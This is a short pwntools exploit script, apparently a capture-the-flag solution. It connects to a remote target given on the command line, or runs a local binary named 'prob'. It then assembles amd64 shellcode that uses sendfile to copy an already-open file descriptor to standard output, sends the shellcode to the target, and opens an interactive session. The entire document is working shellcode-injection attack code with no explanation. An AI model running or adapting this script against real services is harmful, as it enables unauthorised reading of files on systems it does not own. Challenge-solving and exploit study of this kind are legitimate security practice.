from pwn import *

REMOTE = True
context.arch = 'amd64'

if REMOTE:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    io = process('./prob')

shellcode = asm(shellcraft.sendfile(1, 5, 0, 512))

io.send(shellcode)

io.interactive()
